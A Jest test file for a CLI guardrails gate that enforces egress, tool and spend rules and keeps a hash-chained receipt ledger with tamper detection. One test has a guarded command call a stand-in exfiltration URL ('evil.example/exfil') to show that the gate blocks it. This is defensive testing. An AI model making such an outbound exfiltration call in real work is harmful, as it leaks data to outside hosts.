/**
 * `~/.trustshell/guardrails.json`: one user-tuned file the CLI enforces. A disallowed action is refused
 * BEFORE it runs, and the refusal is receipted on a hash chain. No file: nothing changes at all.
 * Every test uses a temp TRUSTSHELL_HOME; the real home is never read or written.
 */
import { createHash } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { parseArgs, run, type CliIO } from '../src/cli';
import { EXIT_REFUSED, plannedAction, runGuarded } from '../src/cli/guard';
import {
  decide,
  defaultGuardrails,
  GUARD_CHECKPOINT_FILE,
  GUARD_RECEIPTS_FILE,
  GUARDRAILS_FILE,
  guardAction,
  parseGuardrails,
  readLedger,
  readLedgerCheckpointed,
  renderGuardrails,
  type GuardReceipt,
  type Guardrails,
} from '../src/lib/guardrails';
import { canonicalize } from '../src/lib/jcs';

const ENGINE = 'repid-engine-production.up.railway.app';

function rules(over: Partial<Guardrails> = {}): Guardrails {
  return { ...defaultGuardrails(), ...over };
}

describe('parseGuardrails: a broken file refuses everything, never fails open', () => {
  it('the default file round-trips and is default-deny', () => {
    const g = parseGuardrails(renderGuardrails(defaultGuardrails())).guardrails as Guardrails;
    expect(g.egress.allow).toEqual([]);
    expect(g.tools.allow).not.toContain('verify');
    expect(g.limits).toMatchObject({ spend_per_action: '0', spend_total: '0' });
  });

  it.each([
    ['a misspelt section', JSON.stringify({ ...defaultGuardrails(), egres: { allow: [] } })],
    ['a URL instead of a host', JSON.stringify(rules({ egress: { allow: ['https://api.github.com'] } }))],
    ['a wildcard host', JSON.stringify(rules({ egress: { allow: ['*.github.com'] } }))],
    ['a number as a limit', JSON.stringify({ ...defaultGuardrails(), limits: { unit: 'x', spend_per_action: 5, spend_total: '0' } })],
    ['a negative limit', JSON.stringify({ ...defaultGuardrails(), limits: { unit: 'x', spend_per_action: '-1', spend_total: '0' } })],
    ['another version', JSON.stringify({ ...defaultGuardrails(), trustshell_guardrails: 2 })],
    ['not JSON', '{ egress: none }'],
  ])('%s', (_name, text) => {
    const r = parseGuardrails(text);
    expect(r.guardrails).toBeNull();
    expect(r.problems.length).toBeGreaterThan(0);
    expect(decide(r.guardrails, { tool: 'recall', hosts: [] }, BigInt(0), r.problems).decision).toBe('REFUSED');
  });

  it('accepts a byte-order mark (PowerShell writes one)', () => {
    expect(parseGuardrails('﻿' + renderGuardrails(defaultGuardrails())).guardrails).not.toBeNull();
  });
});

describe('decide: every broken rule is named', () => {
  const g = rules({ egress: { allow: ['api.github.com'] }, tools: { allow: ['check', 'pay'] }, limits: { unit: 'u', spend_per_action: '100', spend_total: '150' } });

  it('allows what the rules allow', () => {
    expect(decide(g, { tool: 'check', hosts: ['api.github.com'] }, BigInt(0))).toEqual({ decision: 'ALLOWED', reasons: [] });
    expect(decide(g, { tool: 'pay', hosts: [], spend: '100' }, BigInt(50))).toEqual({ decision: 'ALLOWED', reasons: [] });
  });

  it('refuses a tool, a host and a spend, all at once', () => {
    const d = decide(g, { tool: 'verify', hosts: [ENGINE], spend: '101' }, BigInt(100));
    expect(d.decision).toBe('REFUSED');
    expect(d.reasons).toEqual([
      'tool "verify" is not in tools.allow',
      `egress to ${ENGINE} is not in egress.allow`,
      'spend 101 is over spend_per_action 100 (u)',
      'spend 101 would take the total to 201, over spend_total 150 (u)',
    ]);
  });

  it('a broken ledger refuses any spend; a zero, negative or decimal spend is refused', () => {
    expect(decide(g, { tool: 'pay', hosts: [], spend: '1' }, null).reasons).toEqual(['the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed']);
    for (const s of ['0', '-5', '1.5', '1e3']) expect(decide(g, { tool: 'pay', hosts: [], spend: s }, BigInt(0)).decision).toBe('REFUSED');
  });
});

describe('the receipt ledger', () => {
  let home = '';
  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'ts-guard-ledger-'));
    writeFileSync(join(home, GUARDRAILS_FILE), renderGuardrails(rules({ tools: { allow: ['pay'] }, limits: { unit: 'u', spend_per_action: '100', spend_total: '150' } })));
  });
  afterEach(() => rmSync(home, { recursive: true, force: true }));
  const lines = () => readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n');

  it('chains every decision, totals only ALLOWED spends, and refuses past the total', () => {
    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '100' })?.decision.decision).toBe('ALLOWED');
    expect(guardAction(home, { tool: 'nope', hosts: [], spend: '10' })?.decision.decision).toBe('REFUSED');
    const third = guardAction(home, { tool: 'pay', hosts: [], spend: '60' });
    expect(third?.decision.reasons).toEqual(['spend 60 would take the total to 160, over spend_total 150 (u)']);
    const l = readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8'));
    expect(l).toMatchObject({ verdict: 'INTACT', count: 3, spent: BigInt(100) });
    const r = JSON.parse(lines()[2] as string) as GuardReceipt;
    expect(r.prev).toBe((JSON.parse(lines()[1] as string) as GuardReceipt).hash);
    expect(r.guardrails_sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('an edited line or a deleted line breaks the chain, and then no spend is allowed', () => {
    guardAction(home, { tool: 'pay', hosts: [], spend: '100' });
    guardAction(home, { tool: 'pay', hosts: [], spend: '10' });
    guardAction(home, { tool: 'nope', hosts: [] });
    const original = lines();
    // Lower the recorded spend to make room under the total.
    writeFileSync(join(home, GUARD_RECEIPTS_FILE), [original[0]?.replace('"spend":"100"', '"spend":"1"'), ...original.slice(1)].join('\n') + '\n');
    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('BROKEN');
    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '1' })?.decision.reasons).toContain(
      'the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed',
    );
    // Delete the middle line instead.
    writeFileSync(join(home, GUARD_RECEIPTS_FILE), [original[0], original[2]].join('\n') + '\n');
    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('BROKEN');
  });

  it('the checkpoint gives exactly the full verification, and an edit to an old line still breaks the chain', () => {
    for (let i = 0; i < 5; i++) guardAction(home, { tool: 'pay', hosts: [], spend: '10' });
    const text = readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8');
    const cp = readFileSync(join(home, GUARD_CHECKPOINT_FILE), 'utf8');
    expect(readLedgerCheckpointed(text, cp)).toEqual(readLedger(text));
    // Lower an OLD spend (inside the checkpointed bytes): the bytes no longer match, so everything is re-verified.
    writeFileSync(join(home, GUARD_RECEIPTS_FILE), text.replace('"spend":"10"', '"spend":"1"'));
    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '1' })?.decision.reasons).toContain(
      'the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed',
    );
  });

  it('a forged checkpoint hides an edit from a decision, never from guard show (which re-verifies every line)', () => {
    guardAction(home, { tool: 'pay', hosts: [], spend: '100' });
    const edited = readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').replace('"spend":"100"', '"spend":"1"');
    writeFileSync(join(home, GUARD_RECEIPTS_FILE), edited);
    const bytes = Buffer.from(edited, 'utf8');
    writeFileSync(join(home, GUARD_CHECKPOINT_FILE), JSON.stringify({ bytes: bytes.length, sha256: createHash('sha256').update(bytes).digest('hex') }));
    // The limit this documents (GUARD_DOES_NOT_COVER): the ledger and its checkpoint are unkeyed files.
    expect(readLedgerCheckpointed(edited, readFileSync(join(home, GUARD_CHECKPOINT_FILE), 'utf8')).verdict).toBe('INTACT');
    expect(readLedger(edited).verdict).toBe('BROKEN');
  });

  it('each line is its own RFC 8785 form', () => {
    guardAction(home, { tool: 'pay', hosts: [] });
    const line = lines()[0] as string;
    expect(canonicalize(JSON.parse(line))).toBe(line);
  });
});

describe('the CLI enforces the file', () => {
  const prevEnv = { ...process.env };
  const prevFetch = global.fetch;
  let home = '';
  let dialed: string[] = [];
  let out: string[] = [];
  let err: string[] = [];
  const io: CliIO = { out: (s) => out.push(s), err: (s) => err.push(s) };
  let calls: string[] = [];
  const client = {
    verifyOutput: async () => {
      calls.push('verifyOutput');
      return { verdict: 'PASS', trustScore: 90 };
    },
    getRepID: async () => {
      calls.push('getRepID');
      return { agentId: 'a', repid: 1, tier: 'x' };
    },
  } as never;

  /** As the real entry point runs a command: through the gate. */
  const cli = async (...argv: string[]) => {
    out = [];
    err = [];
    const args = parseArgs(argv);
    return runGuarded(args, () => run(args, client, io), io, process.env);
  };
  const receipts = (): GuardReceipt[] =>
    readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as GuardReceipt);

  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'ts-guard-cli-'));
    process.env.TRUSTSHELL_HOME = home;
    process.env.TRUSTSHELL_MEMORY = join(home, 'memory.sqlite');
    delete process.env.TRUSTSHELL_API_URL;
    delete process.env.OFFLINE;
    dialed = [];
    calls = [];
    global.fetch = (async (input: RequestInfo | URL) => {
      dialed.push(String(input));
      throw new Error('network');
    }) as typeof fetch;
  });
  afterEach(() => {
    global.fetch = prevFetch;
    process.env = { ...prevEnv };
    rmSync(home, { recursive: true, force: true });
  });

  it('no file: the gate does nothing and writes nothing', async () => {
    expect(await cli('remember', '--trusted', 'a note')).toBe(0);
    expect(() => readFileSync(join(home, GUARD_RECEIPTS_FILE))).toThrow();
    expect(await cli('guard', 'check', '--tool', 'pay')).toBe(2);
    expect(out.join('\n')).toMatch(/^NOT_CHECKED .*This is not an allow\./);
  });

  it('a disallowed command is refused before it runs (exit 5), dials nothing, and is receipted', async () => {
    expect(await cli('guard', 'init')).toBe(0);
    expect(await cli('verify', 'Paris is the capital of France.')).toBe(EXIT_REFUSED);
    expect(calls).toEqual([]);
    expect(dialed).toEqual([]);
    expect(err.join('\n')).toContain('tool "verify" is not in tools.allow');
    expect(err.join('\n')).toContain(`egress to ${ENGINE} is not in egress.allow`);
    const [r] = receipts();
    expect(r).toMatchObject({ seq: 1, origin: 'Cli', decision: 'REFUSED', action: { tool: 'verify', hosts: [ENGINE] } });
    // The receipt names the action, never the text it was given.
    expect(JSON.stringify(r)).not.toContain('Paris');
    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('INTACT');
  });

  it('an allowed local command runs and is receipted ALLOWED', async () => {
    await cli('guard', 'init');
    expect(await cli('remember', '--trusted', 'ship the receipt')).toBe(0);
    expect(out).toEqual(['remembered']);
    expect(receipts().map((r) => [r.action.tool, r.decision])).toEqual([['remember', 'ALLOWED']]);
  });

  it('allowing the tool is not enough: the host must be allowed too', async () => {
    await cli('guard', 'init');
    await cli('guard', 'allow', 'tool', 'repid');
    expect(await cli('repid', 'agent-1')).toBe(EXIT_REFUSED);
    expect(calls).toEqual([]);
    await cli('guard', 'allow', 'host', ENGINE);
    expect(await cli('repid', 'agent-1')).toBe(0);
    expect(calls).toEqual(['getRepID']);
  });

  it('the fetch backstop refuses a host the table did not predict, and receipts it', async () => {
    await cli('guard', 'init');
    await cli('guard', 'allow', 'tool', 'repid');
    await cli('guard', 'allow', 'host', ENGINE);
    const args = parseArgs(['repid', 'agent-1']);
    const stub = global.fetch;
    const code = await runGuarded(args, async () => {
      await fetch(`https://${ENGINE}/api/v1/ok`).catch(() => undefined); // allowed: reaches the stub
      await fetch('https://evil.example/exfil').catch(() => undefined); // not allowed: never reaches it
      return 0;
    }, io, process.env);
    expect(code).toBe(EXIT_REFUSED);
    expect(dialed).toEqual([`https://${ENGINE}/api/v1/ok`]);
    const last = receipts().pop();
    expect(last).toMatchObject({ decision: 'REFUSED', action: { tool: 'repid', hosts: ['evil.example'] } });
    expect(global.fetch).toBe(stub); // the gate puts the process fetch back
  });

  it('a file that does not parse refuses every guarded command', async () => {
    writeFileSync(join(home, GUARDRAILS_FILE), '{ "egress": ');
    expect(await cli('recall')).toBe(EXIT_REFUSED);
    expect(err.join('\n')).toContain('does not parse');
    expect(await cli('guard', 'show')).toBe(1);
  });

  it('help, version and guard always run, so the person is never locked out of the rules', async () => {
    writeFileSync(join(home, GUARDRAILS_FILE), 'broken');
    expect(await cli('--version')).toBe(0);
    expect(await cli('guard', 'init', '--force')).toBe(0);
    expect(await cli('guard', 'show')).toBe(0);
  });

  it('init --pai is refused while a file is in force: its child process is outside the guard', async () => {
    await cli('guard', 'init');
    expect(await cli('init', '--pai', '--name', 'x')).toBe(EXIT_REFUSED);
    expect(err.join('\n')).toContain('init --pai spawns scripts/init-pai.mjs');
    expect(await cli('init', '--pai', '--dry-run')).toBe(0);
  });

  it('guard check: 0 allowed, 5 refused, totals across calls, receipts every answer', async () => {
    await cli('guard', 'init');
    await cli('guard', 'allow', 'tool', 'pay');
    await cli('guard', 'limit', 'per-action', '100');
    await cli('guard', 'limit', 'total', '150');
    expect(await cli('guard', 'check', '--tool', 'pay', '--spend', '100')).toBe(0);
    expect(await cli('guard', 'check', '--tool', 'pay', '--spend', '100')).toBe(EXIT_REFUSED);
    expect(out.join('\n')).toContain('over spend_total 150');
    expect(await cli('guard', 'check', '--tool', 'shell', '--host', 'evil.example', '--json')).toBe(EXIT_REFUSED);
    expect(JSON.parse(out.join('\n'))).toMatchObject({ decision: 'REFUSED', receipt: { seq: 3 } });
    expect(await cli('guard', 'show')).toBe(0);
    expect(out.join('\n')).toContain('100 allowed so far');
  });

  it('guard edits are validated before they are written', async () => {
    await cli('guard', 'init');
    expect(await cli('guard', 'allow', 'host', 'https://evil.example/')).toBe(2);
    expect(await cli('guard', 'limit', 'total', '-1')).toBe(2);
    expect(parseGuardrails(readFileSync(join(home, GUARDRAILS_FILE), 'utf8')).guardrails).toEqual(defaultGuardrails());
  });
});

describe('plannedAction mirrors the HELP egress table', () => {
  const env = {} as NodeJS.ProcessEnv;
  it.each([
    [['verify', 'x'], [ENGINE]],
    [['check', 'https://github.com/o/r/actions/runs/1'], ['api.github.com']],
    [['check', '2 + 2 = 4'], [ENGINE]],
    [['quarantine', 'release', '1', '--check', 'hal'], [ENGINE]],
    [['quarantine', 'release', '1', '--trusted'], []],
    [['recall'], []],
    [['bundle', 'export', 'f.json'], []],
  ])('%j dials %j', (argv, hosts) => {
    expect(plannedAction(parseArgs(argv as string[]), env).action.hosts).toEqual(hosts);
  });
  it('OFFLINE=1 dials nothing; TRUSTSHELL_API_URL moves the backend host', () => {
    expect(plannedAction(parseArgs(['verify', 'x']), { NODE_ENV: 'test', OFFLINE: '1' }).action.hosts).toEqual([]);
    expect(plannedAction(parseArgs(['repid', 'a']), { NODE_ENV: 'test', TRUSTSHELL_API_URL: 'https://engine.example.org/' }).action.hosts).toEqual(['engine.example.org']);
  });
});
